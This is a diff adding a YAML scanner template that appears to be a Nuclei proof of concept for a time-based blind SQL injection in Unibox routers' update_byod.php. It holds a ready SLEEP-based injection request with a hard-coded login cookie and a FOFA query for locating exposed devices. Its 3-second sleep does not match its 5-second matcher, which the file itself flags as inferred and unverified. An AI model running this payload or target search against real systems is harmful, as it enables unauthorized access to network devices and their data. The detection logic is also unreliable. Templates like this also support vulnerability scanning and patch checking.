@@ -1,0 +1,40 @@
+id: poc-ks5hox99nuey7tf1
+info:
+  name: Unibox路由器 update_byod.php 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ks5hox99nuey7tf1
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ks5hox99nuey7tf1
+    fofa: body="Unibox" && body="Controller" || body="www.wifi-soft.com"
+http:
+- raw:
+  - 'GET /authentication/update_byod.php?update=1&macAddress=1&macAddress=1''+AND+(SELECT+2936+FROM+(SELECT(SLEEP(3)))EuPD)+--+pcs HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cache-Control: no-cache
+
+    Connection: keep-alive
+
+    Cookie: user=unibox; pass=294a3d333d2f6b7e121594189fce9a72
+
+    Pragma: no-cache
+
+    Upgrade-Insecure-Requests: 1'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
